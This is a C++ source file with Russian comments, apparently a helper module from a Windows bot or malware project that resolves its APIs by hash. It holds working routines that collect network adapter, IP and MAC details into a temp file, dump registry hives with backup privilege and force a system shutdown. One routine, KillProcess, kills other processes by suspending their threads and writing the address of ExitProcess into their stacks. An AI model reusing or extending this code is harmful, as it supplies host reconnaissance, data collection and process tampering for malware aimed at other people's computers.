			SD.Mask = Mask;
			SD.Data = Data;
			SD.Attributes = FileAttributes;
			SD.CallBack = CallBack;
			return SearchFiles(Path, "*.*", true, FA_DIRECTORY, &SD, RecursuveSearchCallBack);
		}
		else
			return true;
	}

	bool Cancel = false;
	bool RecursiveHandled = false;
    DWORD Count = 0;
	PCHAR NewPath;
	DWORD Attributes = FileAttributes;

	if (Recursive)
		Attributes = Attributes | FILE_ATTRIBUTE_DIRECTORY;

	do
	{
        if (!InvalidPath(Find.cFileName))
		if ((Find.dwFileAttributes & Attributes) != 0)
		{
            Count++;
			// Собираем полное имя
            if ((Find.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0)
				NewPath = STR::New(3, Path, Find.cFileName, "\\");
			else
				NewPath = STR::New(2, Path, Find.cFileName);

			// Вызываем метод обратной связи
			if ((Find.dwFileAttributes & FileAttributes) != 0)
				CallBack(&Find,  NewPath, Data, Cancel);
            //
			if (!Cancel && Recursive && (Find.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0)
			{
				RecursiveHandled = true;
				Cancel = !SearchFiles(NewPath, Mask, true, FileAttributes, Data, CallBack);
			}

			STR::Free(NewPath);
			if (Cancel) break;
		}
	}
	while (pFindNextFileA(File, &Find));

	pFindClose(File);
	STR::Free(SearchMask);

	// В случае если рекурсивный поиск не обработан, то производим
	// рекурсивный перебор директорий
	if (!Cancel && Recursive && !RecursiveHandled && Count > 0)
	{
		TRecursiveSearchData SD;
		SD.Mask = Mask;
		SD.Data = Data;
		SD.Attributes = FileAttributes;
		SD.CallBack = CallBack;
        Cancel = SearchFiles(Path, "*.*", true, FA_DIRECTORY, &SD, RecursuveSearchCallBack) == false;
    }

	return Cancel == false;
}
//----------------------------------------------------------------------------

DWORD GetUniquePID()
{
	// Функция возвращает уникальный идентификатор процесса. Определяется по
	// потоку из которого вызывается модуль
	HANDLE Thread = pGetCurrentThread();
	THREAD_BASIC_INFORMATION Threads;
	DWORD dwReturnLen;

	if ( pZwQueryInformationThread(Thread, ThreadBasicInformation, &Threads, sizeof( THREAD_BASIC_INFORMATION ), &dwReturnLen ) == STATUS_SUCCESS )
		return (DWORD)Threads.ClientId.UniqueProcess;

	return -1;
}
//----------------------------------------------------------------------------

bool IsNewProcess(DWORD &ProcessID)
{
	// Функция возвращает истину если идентификатор текущего процесса
	// отличается от идентификатора ProcessID. Если это другой процесс
	// то PID будет записан в ProcessID
	DWORD NewPID = GetUniquePID();
	if (ProcessID != NewPID)
	{
		ProcessID = NewPID;
        return true;
	}
	return false;
}


//----------------------------------------------------------------------------
char *GetNetInfo()
{

	// Какому мудаку было впадлу пару строчек коментария вписать???????

/*	char iphldll[] = {'i','p','h','l','p','a','p','i','.','d','l','l',0};

	typedef DWORD ( WINAPI *PGetAdaptersInfo )( PIP_ADAPTER_INFO pAdapterInfo, PULONG pOutBufLen );

	PGetAdaptersInfo pGetAdaptersInfo = (PGetAdaptersInfo)GetProcAddressEx( iphldll, 0, 0xE69A1CD7 );*/

	PIP_ADAPTER_INFO pAdapterInfo;

	PIP_ADAPTER_INFO pAdapter = NULL;
	DWORD dwRetVal			  = 0;

	pAdapterInfo	  = (IP_ADAPTER_INFO *)MemAlloc( sizeof(IP_ADAPTER_INFO) );
	ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);


	if ( (ULONG)pGetAdaptersInfo( pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW )
	{
		MemFree(pAdapterInfo);
		pAdapterInfo = (IP_ADAPTER_INFO *) MemAlloc ( ulOutBufLen );
	}

	typedef int ( WINAPI *fwsprintfA )( LPTSTR lpOut, LPCTSTR lpFmt, ... );
	fwsprintfA _pwsprintfA = (fwsprintfA)GetProcAddressEx( NULL, 3, 0xEA3AF0D7 );

	PCHAR FileName = File::GetTempNameA();

	if ( !FileName )
	{
		return NULL;
	}


	HANDLE hLog = (HANDLE)pCreateFileA( FileName, GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0 );

	if ( hLog == (HANDLE)-1 )
	{
		return NULL;
	}

	DWORD dwWritten = 0;

	if ( ( dwRetVal = (ULONG)pGetAdaptersInfo( pAdapterInfo, &ulOutBufLen)) == NO_ERROR )
	{
		pAdapter = pAdapterInfo;

		while ( pAdapter )
		{
			char *Buffer = (char*)MemAlloc( 1024 );

			_pwsprintfA( Buffer, "\tAdapter Name: \t%s\r\n", pAdapter->AdapterName);
			pWriteFile( hLog, Buffer, m_lstrlen( Buffer ), &dwWritten, 0 );

			_pwsprintfA( Buffer, "\tAdapter Desc: \t%s\r\n", pAdapter->Description);
			pWriteFile( hLog, Buffer, m_lstrlen( Buffer ), &dwWritten, 0 );

			_pwsprintfA( Buffer, "\tAdapter Addr: \t%ld\r\n", pAdapter->Address);
			pWriteFile( hLog, Buffer, m_lstrlen( Buffer ), &dwWritten, 0 );

			_pwsprintfA( Buffer, "\tIP Address: \t%s\r\n", pAdapter->IpAddressList.IpAddress.String);
			pWriteFile( hLog, Buffer, m_lstrlen( Buffer ), &dwWritten, 0 );

			_pwsprintfA( Buffer, "\tIP Mask: \t%s\r\n", pAdapter->IpAddressList.IpMask.String);
			pWriteFile( hLog, Buffer, m_lstrlen( Buffer ), &dwWritten, 0 );

			_pwsprintfA( Buffer, "\tGateway: \t%s\r\n", pAdapter->GatewayList.IpAddress.String);
			pWriteFile( hLog, Buffer, m_lstrlen( Buffer ), &dwWritten, 0 );

			_pwsprintfA( Buffer, "\tMAC Address: %2X-%2X-%2X-%2X-%2X-%2X",  pAdapter->Address[0], pAdapter->Address[1],
											pAdapter->Address[2], pAdapter->Address[3],
											pAdapter->Address[4], pAdapter->Address[5] );

			pWriteFile( hLog, Buffer, m_lstrlen( Buffer ), &dwWritten, 0 );
			

			_pwsprintfA( Buffer, "\t\r\n\r\n***\r\n\r\n\r\n");
			pWriteFile( hLog, Buffer, m_lstrlen( Buffer ), &dwWritten, 0 );

			
			if ( pAdapter->DhcpEnabled )
			{
				_pwsprintfA( Buffer, "\tDHCP Enabled: Yes\r\n");
				pWriteFile( hLog, Buffer, m_lstrlen( Buffer ), &dwWritten, 0 );

				_pwsprintfA( Buffer, "\t\tDHCP Server: \t%s\r\n", pAdapter->DhcpServer.IpAddress.String);
				pWriteFile( hLog, Buffer, m_lstrlen( Buffer ), &dwWritten, 0 );

				_pwsprintfA( Buffer, "\tLease Obtained: %ld\r\n", pAdapter->LeaseObtained);
				pWriteFile( hLog, Buffer, m_lstrlen( Buffer ), &dwWritten, 0 );
			}
			else
			{
				_pwsprintfA( Buffer, "\tDHCP Enabled: No\r\n");
				pWriteFile( hLog, Buffer, m_lstrlen( Buffer ), &dwWritten, 0 );
			}

			if ( pAdapter->HaveWins )
			{
				_pwsprintfA( Buffer, "\tHave Wins: Yes\r\n");
				pWriteFile( hLog, Buffer, m_lstrlen( Buffer ), &dwWritten, 0 );

				_pwsprintfA( Buffer, "\t\tPrimary Wins Server: \t%s\r\n", pAdapter->PrimaryWinsServer.IpAddress.String);
				pWriteFile( hLog, Buffer, m_lstrlen( Buffer ), &dwWritten, 0 );

				_pwsprintfA( Buffer, "\t\tSecondary Wins Server: \t%s\r\n", pAdapter->SecondaryWinsServer.IpAddress.String);
				pWriteFile( hLog, Buffer, m_lstrlen( Buffer ), &dwWritten, 0 );
			}
			else
			{
				_pwsprintfA( Buffer, "\tHave Wins: No\r\n");
				pWriteFile( hLog, Buffer, m_lstrlen( Buffer ), &dwWritten, 0 );
			}

			
			pAdapter = pAdapter->Next;
		}
	}

	pCloseHandle( hLog );	

	return FileName;
}

DWORD GetFileFormat( WCHAR *lpFileName )
{
	if ( !lpFileName )
	{
		return 0;
	}

	WCHAR *Name = NULL;

	WCHAR lpFile[ MAX_PATH ];
	plstrcpyW( lpFile, lpFileName );
	m_wcslwr( lpFile );
	
	for ( DWORD i = m_wcslen( lpFile ) - 1; i > 0; i-- )
	{
		if ( lpFile[i] == '.' )
		{
			Name = &lpFile[i + 1];
			break;
		}
	}

	return CalcHashW( Name );
}


void MakeShutdown()
{
	BOOLEAN bWasEnabled;
	pRtlAdjustPrivilege( SE_SHUTDOWN_PRIVILEGE, TRUE, FALSE, &bWasEnabled );
	pZwShutdownSystem( 1 );

	return;
}


//----------------------------------------------------------------------------
// Registry - методы для работы с реестром Windows
//----------------------------------------------------------------------------

bool Registry::CreateKey(HKEY h, char* path, char* name )
{
	// cсоздать раздел в реестре
	//  CreateKey(HKEY_CURRENT_USER,"Software\\Microsoft\\Internet Explorer\\Main","TabProcGrowth");
	HKEY key;
	if((long)pRegOpenKeyExA(h, path, 0, KEY_WRITE, &key) == REG_OPENED_EXISTING_KEY)
		return false;
	if ((LONG)pRegCreateKeyA(key, name, &key) != ERROR_SUCCESS)
		return false;

	pRegCloseKey(key);
	return true;
}


bool Registry::SetValueString(HKEY h, char* path, char* name,  char* values )
{
	//корневой ключ, путь без ключа, имя создаваемого значения,
	// значение(создает заменяет значение REG_SZ)
	HKEY key;
	TCHAR title[MAX_PATH];
	m_memset(title,0,MAX_PATH);

	if((long)pRegOpenKeyExA(h,path,0,KEY_WRITE, &key)==REG_OPENED_EXISTING_KEY)
		return false;
	m_lstrcpy(title, values);
//   RegGetValueA
	pRegSetValueExA(key, name, 0,REG_SZ,(LPBYTE)title,m_lstrlen(values));
	pRegCloseKey(key);
	return true;
}

bool Registry::SetValueDWORD(HKEY h, char* path, char* name,  DWORD values )
{
	//Корневой ключ, путь без ключа, имя создаваемого значения,
	// значение(создает заменяет значение REG_DWORD)
	HKEY key;
	if((long)pRegOpenKeyExA(h,path,0,KEY_WRITE, &key)==REG_OPENED_EXISTING_KEY)
		return false;
	pRegSetValueExA(key, name, 0,REG_DWORD,(CONST BYTE*)&values,sizeof(DWORD));
	pRegCloseKey(key);
	return true;
}


// Функция получает строковое значение из реестра
PCHAR Registry::GetStringValue(HKEY Key, PCHAR SubKey, PCHAR Value)
{
	// Функция получает строковое значение из реестра
	HKEY OpenedKey;
	// Открываем ключ
	if (pRegOpenKeyExA(HKEY_CURRENT_USER, SubKey, 0, KEY_READ, &OpenedKey) != ERROR_SUCCESS)
		return NULL;

	DWORD Type = REG_SZ;
	DWORD Sz = 0;
	PCHAR Result = NULL;

	// Получаем размер строки
	if (pRegQueryValueExA(OpenedKey, Value, NULL, &Type, NULL, &Sz) == ERROR_SUCCESS)
	{
		// Читаем строку
		Result = STR::Alloc(Sz);
		if (pRegQueryValueExA(OpenedKey, Value, NULL, &Type, Result, &Sz)  != ERROR_SUCCESS)
		STR::Free2(Result);;
    }

	pRegCloseKey(OpenedKey);
	return Result;
}

bool Registry::CreateValueString(HKEY h, char* path, char* name,  char* values )
{
  //корневой ключ, путь без ключа, имя создаваемого значения,
 // значение(создает заменяет значение REG_SZ)
    HKEY hKey;
	if((long)pRegOpenKeyExA(h, path, 0, KEY_WRITE, &hKey) == REG_OPENED_EXISTING_KEY)
	{
		pRegSetValueExA(hKey,name, NULL, REG_SZ,(LPBYTE)values,m_lstrlen(values));
        pRegCloseKey(hKey);
		return true;
    }
    if((long)pRegCreateKeyExA(h,path,0,"",REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL,&hKey,NULL)==ERROR_SUCCESS)
    {
		pRegSetValueExA(hKey,name, NULL, REG_SZ,(LPBYTE)values,m_lstrlen(values));
        pRegCloseKey(hKey);
		return true;
    }
	return false;
}


bool Registry::CreateValueREGMULTI_SZ(HKEY h, char* path, char* name,  char* values,DWORD sise )
{
	HKEY hKey;
	if((long)pRegOpenKeyExA(h, path, 0, KEY_WRITE, &hKey) == REG_OPENED_EXISTING_KEY)
	{
		pRegSetValueExA(hKey,name, NULL, REG_MULTI_SZ,(LPBYTE)values,sise);
        pRegCloseKey(hKey);
		return true;
    }
    if((long)pRegCreateKeyExA(h,path,0,"",REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL,&hKey,NULL)==ERROR_SUCCESS)
    {
		pRegSetValueExA(hKey,name, NULL, REG_MULTI_SZ,(LPBYTE)values,sise);
        pRegCloseKey(hKey);
		return true;
    }
	return false;
}
// добавляет права SE_BACKUP_NAME
bool Registry::SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)
{
	TOKEN_PRIVILEGES tp;
	LUID luid;
	HANDLE hToken; 

	pOpenProcessToken(pGetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
	if ( !pLookupPrivilegeValueA(NULL, lpszPrivilege, &luid) )    
		return false; 
	
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	
	if (bEnablePrivilege)
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
	    tp.Privileges[0].Attributes = 0;

	pAdjustTokenPrivileges(hToken, FALSE, &tp, 0, (PTOKEN_PRIVILEGES) NULL, 0); 

	return ( (pGetLastError()!=ERROR_SUCCESS)?false:true);
}


//	Есть ли ключ
//	Вернет  TRUE если да, иначе FALSE
bool Registry::IsKeyExist(HKEY hRoot, LPCSTR KeyPath)
{
	HKEY		hKey;
	bool		ret;

	if ( hRoot == NULL ) return false;
	if ( KeyPath == NULL || (!plstrlenA(KeyPath)) ) return false;
	
	ret =((pRegOpenKeyExA (hRoot, KeyPath, 0, KEY_EXECUTE, &hKey)!=ERROR_SUCCESS)?false:true);
	//ret =(bool) pRegOpenKeyExA (hRoot, KeyPath, 0, KEY_EXECUTE, &hKey);

	if ( ((LONG)pRegOpenKeyExA (hRoot, KeyPath, 0, KEY_EXECUTE, &hKey)==ERROR_FILE_NOT_FOUND) ||
		 ((LONG)pRegOpenKeyExA (hRoot, KeyPath, 0, KEY_EXECUTE, &hKey)!=ERROR_SUCCESS) )
		ret=false;
	else 
		ret=true;
	
	pRegCloseKey (hKey);

	return ret;
}
// сохраняет ключь реестра в файл
// тобишь Registry::SaveRegKeyPath(HKEY_LOCAL_MACHINE,"Software\\Policies\\Microsoft","d:\\e.txt");
bool Registry::SaveRegKeyPath(HKEY hRoot, PCHAR SubKey,PCHAR OutFile)
{
	bool	ret=true;
	HKEY	hKey=NULL;
	DWORD	d;

	SetPrivilege(SE_BACKUP_NAME,TRUE);

	if (pRegOpenKeyExA(hRoot, SubKey,0,KEY_READ, &hKey)==ERROR_SUCCESS)  
	{
		if (FileExistsA(OutFile))
		{
			if (pDeleteFileA(OutFile))	//we must delete file before saving, otherwise it doesn't work !
				d=(LONG)pRegSaveKeyExA(hKey,OutFile,NULL,REG_STANDARD_FORMAT);
		} 
		else 
			d=(LONG)pRegSaveKeyExA(hKey,OutFile,NULL,REG_STANDARD_FORMAT);
		if (d!=ERROR_SUCCESS) 
		{
			ret=false;			
		}		
		pRegCloseKey(hKey);	
	} 
	else 
	{ 
		if (IsKeyExist(hRoot,SubKey)==false)
			d=ERROR_FILE_NOT_FOUND;
		else d=pGetLastError();
		//PrintError(d);
		ret=false;
	}
	
	SetPrivilege(SE_BACKUP_NAME,FALSE);

	return ret;
}


//----------------------------------------------------------------------------
// FILE - методы для работы с файлами
//----------------------------------------------------------------------------


DWORD File::WriteBufferA(PCHAR FileName, LPVOID Buffer, DWORD BufferSize)
{
	// Записать данные из буфера в файл. ANSI версия

	if (FileName == NULL)
		return 0;

	HANDLE File = pCreateFileA(FileName, GENERIC_WRITE, FILE_SHARE_READ, 0,
								CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);

	if (File == INVALID_HANDLE_VALUE)
		return 0;

	DWORD Size = 0;
	if (Buffer != NULL && BufferSize != 0)
		pWriteFile(File, Buffer, BufferSize, &Size, NULL);

	pCloseHandle(File);

	return Size;
}
//----------------------------------------------------------------------------

DWORD File::WriteBufferW(PWCHAR FileName, LPVOID Buffer, DWORD BufferSize)
{
	// Записать данные из буфера в файл. Unicode версия

	if (FileName == NULL)
		return 0;

	HANDLE File = pCreateFileW(FileName, GENERIC_WRITE, FILE_SHARE_READ, 0,
								CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);


	if (File == INVALID_HANDLE_VALUE)
		return 0;

	DWORD Size = 0;
    pWriteFile(File, Buffer, BufferSize, &Size, NULL);

	pCloseHandle(File);

	return Size;
}
//----------------------------------------------------------------------------

LPBYTE FileRealReadToBuffe(HANDLE File, DWORD &BufferSize)
{
	BufferSize = 0;
	if (File == INVALID_HANDLE_VALUE)
		return NULL;

	DWORD H;
	DWORD Size = (DWORD)pGetFileSize(File, &H);

    LPBYTE Result = NULL;
	if (Size > 0)
	{
		// Читаем файл
		Result = (LPBYTE)MemAlloc(Size);
		DWORD Readed;
		if (Result != NULL)
			pReadFile(File, Result, Size, &Readed, NULL);
        BufferSize = Readed;
    }

	pCloseHandle(File);
	return Result;
}

//----------------------------------------------------------------------------

LPBYTE File::ReadToBufferA(PCHAR FileName, DWORD &BufferSize)
{
	// Прочитать файл в буфер

	if (FileName == NULL)
		return NULL;

	HANDLE File = pCreateFileA(FileName, GENERIC_READ, FILE_SHARE_READ, 0,
								OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

	return FileRealReadToBuffe(File, BufferSize);
}
//----------------------------------------------------------------------------

LPBYTE File::ReadToBufferW(PWCHAR FileName, DWORD &BufferSize)
{
	// Прочитать файл в буфер
	if (FileName == NULL)
		return NULL;

	HANDLE File = pCreateFileW(FileName, GENERIC_READ, FILE_SHARE_READ, 0,
								OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

	return FileRealReadToBuffe(File, BufferSize);
}
//----------------------------------------------------------------------------

PCHAR File::ChangeFileExt(PCHAR FileName, PCHAR Ext)
{
	// Изменить расширение файла. Касается только строки FileName!!!
	// Примечание - Расширение меняется вместе с точкой
	// Результат - НОВАЯ строка с именем файла
	if (STR::IsEmpty(FileName))
    	return NULL;

	PCHAR EndPtr = STR::End(FileName);

	// Ишем точку в файле
	while (*EndPtr != '.')
	{
		if (EndPtr == FileName || *EndPtr == '/' || *EndPtr == '\\')
		{
			EndPtr = NULL;
			break;
        }
        EndPtr--;
    }


	//
	if (EndPtr == NULL)
		return STR::New(2, FileName, Ext);
	else
	{
		DWORD Sz = EndPtr - FileName;
		DWORD ExtLen = StrCalcLength(Ext);
		PCHAR Res = STR::Alloc(Sz + ExtLen);
		STR::Copy(FileName, Res, 0, Sz);
		STR::Copy(Ext, Res + Sz, 0, ExtLen);
		return Res;
	}
}
//-----------------------------------------------------------------------------

PCHAR File::GetTempNameA()
{
	PCHAR Path = STR::Alloc(MAX_PATH);
	if (Path == NULL) return NULL;

	pGetTempPathA( MAX_PATH, Path );
	pGetTempFileNameA(Path, "", 0, Path);

	return Path;
}

//-----------------------------------------------------------------------------

PWCHAR File::GetTempNameW()
{
	PWCHAR Path = WSTR::Alloc(MAX_PATH);
	if (Path == NULL) return NULL;

	pGetTempPathW( MAX_PATH, Path );
	pGetTempFileNameW(Path, "", 0, Path);

	return Path;
}
//-----------------------------------------------------------------------------

PCHAR File::ExtractFileNameA(PCHAR FileName, bool DuplicateStr)
{
	//  Функции извлекают имя файла из полного пути
	//  FileName - полное имя файла, если не содержит разделителей / либо\
	//  	то функция вернёт всю строку
	//  DuplicateStr - Установить в истину, если необходимо создать
	//		новую строку из результата. В случае false функция вернёт указатель
	//      на первый символ имени в исходной строке

	if (STR::IsEmpty(FileName)) return NULL;

	PCHAR End = NULL;

	for (PCHAR Tmp = FileName; *Tmp != 0; Tmp++)
		if (*Tmp == '\\' || *Tmp == '/') End = Tmp;


	if (End != NULL)
        End++;
	else
		End = FileName;

	if (DuplicateStr)
		return STR::New(End);
	else
		return End;
}

PWCHAR File::ExtractFileNameW(PWCHAR FileName, bool DuplicateStr)
{
	if (WSTR::IsEmpty(FileName)) return NULL;

	PWCHAR End = NULL;

	for (PWCHAR Tmp = FileName; *Tmp != 0; Tmp++)
		if (*Tmp == '\\' || *Tmp == '/') End = Tmp;


	if (End != NULL)
        End++;
	else
		End = FileName;


	if (DuplicateStr)
		return WSTR::New(End);
	else
		return End;
}
// ---------------------------------------------------------------------------------------
/*//есть ли текущий файл на диске
BOOL File::isFileExist(CHAR* filename)
{
	DWORD attr = (DWORD)pGetFileAttributesA(filename);
	if(attr == INVALID_FILE_ATTRIBUTES) return FALSE;
	return TRUE;
}*/
//-----------------------------------------------------------------------------

PCHAR File::ExtractFilePathA(PCHAR FileName)
{
	// функция извлекает имя файла из его полного имени
	if (STR::IsEmpty(FileName))
		return NULL;

	PCHAR End = STR::End(FileName);

	while (End > FileName && *End != '/' && *End != '\\') End--;

	if (End == FileName)
		return NULL;
	else
		return STR::New(FileName, (End - FileName) + 1);
}
//-----------------------------------------------------------------------------


void EnumDrives(DWORD DriveType, TEnumDrivesMethod Method, LPVOID Data)
{
	// Функция перебирает все подключенные в системе диски
	if (Method == NULL) return;

	// Получаем список дисков
	static const DWORD Size = 255;
	PCHAR Drives = STR::Alloc(Size);
	if (Drives == NULL)
		return;

	pGetLogicalDriveStringsA(Size, Drives);


	// Перебираем диски
	bool Cancel = false;
	PCHAR Tmp = Drives;
	while (*Tmp != 0)
	{
		if (DriveType == DRIVE_UNKNOWN || (DWORD)pGetDriveTypeA(Tmp) == DriveType)
		{
			Method(Tmp, Data, Cancel);
			if (Cancel) break;
		}

		Tmp = STR::End(Tmp);
		Tmp++;
	}

	STR::Free(Drives);
}

//-----------------------------------------------------------------------------

bool IsExecutableFile(LPVOID Buf)
{
	// Функция возвращает истину если буффер является заголовком
	// exe файла
	if (Buf == NULL) return false;


	WORD Nomber = PIMAGE_DOS_HEADER(Buf)->e_magic;

	return (Nomber == IMAGE_DOS_SIGNATURE) ||
		   (Nomber == IMAGE_NT_SIGNATURE);

}
//----------------------------------------------------------------------------

// Эту срань убрать
LPBYTE GetFileData( WCHAR *Path, LPDWORD dwDataSize )
{


	HANDLE hFile = (HANDLE)pCreateFileW( Path, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 );

	if ( hFile == INVALID_HANDLE_VALUE )
	{
		return NULL;
	}

	DWORD h = 0;
	DWORD dwFileSize = (DWORD)pGetFileSize( hFile, &h );

	HANDLE hMapFile = (HANDLE)pCreateFileMappingW( hFile, 0, PAGE_READONLY, 0, dwFileSize, 0 );

	if ( hMapFile == INVALID_HANDLE_VALUE )
	{
		return NULL;
	}

	LPBYTE pbyFile  = (LPBYTE)pMapViewOfFile( hMapFile, FILE_MAP_READ, 0, 0, 0 );

	LPBYTE pbF = (LPBYTE)MemAlloc( dwFileSize + 1 );
	m_memcpy( pbF, pbyFile, dwFileSize );

	pUnmapViewOfFile( pbyFile );
	pCloseHandle( hMapFile );
	pCloseHandle( hFile );

	*dwDataSize = dwFileSize;

	return pbF;
}

// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

// Нахуй руки оторву за такую писанину!!!!!!!!!!!!!!!! GSV

// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

// ----------------------------------------------------------------------------------------
bool isFileExists(int FlagFolderDest, WCHAR*Path)
{
	// Эта поебень делает такую-то хуйню
	// тоесть проверяет существуер ли файл в стандартном пути(определенном системой)+Path  

	WCHAR SysPath[MAX_PATH];
	pSHGetFolderPathW(NULL, FlagFolderDest, NULL, SHGFP_TYPE_CURRENT, SysPath);
	plstrcatW( SysPath, L"\\" );
	plstrcatW( SysPath, Path );
	return FileExistsW(SysPath);
}

// ----------------------------------------------------------------------------------------
// Сложно бля пару переводов строки после функции сделать, ну топо разделить код одной функции от другой
bool FileCreateInFolder(int FlagFolderDest, WCHAR*Path,LPVOID Data,int count)
{
    // И эта поебень хуёзнает чё-то делает
	// тоесть создает файл и пишет данные заданным размером

	WCHAR SysPath[MAX_PATH];
	pSHGetFolderPathW(NULL, FlagFolderDest, NULL, SHGFP_TYPE_CURRENT, SysPath);
	plstrcatW( SysPath, L"\\" );
	plstrcatW( SysPath, Path );
	if (File::WriteBufferW( SysPath, Data, count ))
		return true;
	else
		return false;
}
// ----------------------------------------------------------------------------------------

int ReadFileA(char *szFileName, char **OutBuf)
{	
	int result = 0;
	// Открываем файл на чтение
	HANDLE hFile = pCreateFileA(szFileName, GENERIC_READ, FILE_SHARE_READ, NULL,
														OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

	// Если не удалось прочесть, выходим с ошибкой
	if (INVALID_HANDLE_VALUE != hFile)
	{
		DWORD fSize = FileSize(hFile);
		if (fSize > 0)
		{
			DWORD rSize = 0;			
			*OutBuf = (char *)MemAlloc(SIZE_T(fSize) + 1);
			if (pReadFile(hFile, *OutBuf, fSize, &rSize, NULL))
				result = rSize;
		}
		// Закрываем файл
		pCloseHandle(hFile);
	}
	
	return result;
}
//не проверенно
bool GetFileDataFilder(int FlagFolderDest, WCHAR*Path,LPVOID Data,int *count)
{
	WCHAR SysPath[MAX_PATH];
	pSHGetFolderPathW(NULL, FlagFolderDest, NULL, SHGFP_TYPE_CURRENT, SysPath);
	plstrcatW( SysPath, L"\\" );
	plstrcatW( SysPath, Path );
	
	char *Name = WSTR::ToAnsi(SysPath, 0);
	*count=ReadFileA( Name, (char **)&Data);
	MemFree(Name);
	if (Data==NULL)
		return false;
	
	return true;
}

//#include "BotDebug.h"


namespace java_patchers
{
    #include "DbgTemplates.h"
}
#define OutMessages  java_patchers::DBGOutMessage<>


BOOL KillProcess(DWORD pid,DWORD TimeOut )
{
const static DWORD MAX_COUNT_THREAD = 0x20;
	THREADENTRY32	Thread;
	HANDLE			hProcess;
	HANDLE			hSnap;
	DWORD			Threads[MAX_COUNT_THREAD] ;
	
	m_memset(Threads,0,sizeof(Threads));
	m_memset(&Thread,0,sizeof(Thread));
	Thread.dwSize = sizeof(Thread);
	OutMessages("[KillProcess]","start killing");
	if ( (hProcess = (HANDLE)pOpenProcess(PROCESS_TERMINATE,FALSE,pid))  )
	{
		pTerminateProcess(hProcess,0);
		pCloseHandle(hProcess);
		return TRUE;
	}
	else
	{
		OutMessages("OpenProcess for terminate fail",StrLongToString(pGetLastError()));
	};
	
	if ( (hSnap = (HANDLE)pCreateToolhelp32Snapshot(TH32CS_SNAPTHREAD,pid)) == INVALID_HANDLE_VALUE  )
	{
		OutMessages("pCreateToolhelp32Snapshot fail",StrLongToString(pGetLastError()));
		return FALSE;
	};
	
	if ( pThread32First(hSnap,&Thread) )
	{
		DWORD i = 0;
		do{
			if ( (Thread.th32OwnerProcessID == pid) & ( i< MAX_COUNT_THREAD) )
				Threads[i++] = Thread.th32ThreadID;

		}while(pThread32Next(hSnap,&Thread));

		pCloseHandle(hSnap);
	}

	if (! (hProcess = (HANDLE)pOpenProcess(SYNCHRONIZE | PROCESS_VM_WRITE|PROCESS_VM_OPERATION,FALSE,pid))  )
	{
		OutMessages("OpenProcess fail",StrLongToString(pGetLastError()));
		
		return FALSE;
	};

	for (DWORD i = 0; i<MAX_COUNT_THREAD; ++i)
	if ( Threads[i] )
	{
		HANDLE	htmp;
		CONTEXT ctx;

		if (Threads[i] == (DWORD)pGetCurrentThreadId())
			continue;

		if ( ! (htmp = (HANDLE)pOpenThread(THREAD_GET_CONTEXT | THREAD_SUSPEND_RESUME,FALSE,Threads[i]))  )
		{
			OutMessages("OpenThread fail",StrLongToString(pGetLastError()));
			continue;
		};
			pSuspendThread(htmp);
			
			ctx.ContextFlags = CONTEXT_CONTROL | CONTEXT_INTEGER;
			if(pGetThreadContext(htmp,&ctx))
			{
				DWORD s;
				DWORD TargetAddr;
				PVOID new_addr = pGetProcAddress(pGetModuleHandleA("KERNEL32"),"ExitProcess");
				TargetAddr = ctx.Ebp + sizeof(DWORD);
				if ( (TargetAddr > 1024*1024 ) & (TargetAddr <  (1 << (sizeof(DWORD)*8-1)))  )  
				{
					if (! pVirtualAllocEx(hProcess,TargetAddr,sizeof(new_addr),MEM_COMMIT,PAGE_READWRITE) )
					{
						OutMessages("VirtualAllocEx fail",StrLongToString(pGetLastError()));
					};
					if (! pWriteProcessMemory(hProcess,TargetAddr,&new_addr,sizeof(new_addr),&s) )
					{
						OutMessages("WriteProcessMemory fail",StrLongToString(pGetLastError()));
					};
				};
			};
			pResumeThread(htmp);
			pCloseHandle(htmp);
		};
	
	BOOL ret = ( WAIT_OBJECT_0 == (DWORD)pWaitForSingleObject(hProcess,TimeOut) )? TRUE:FALSE;
	pCloseHandle(hProcess);

	return ret ;
};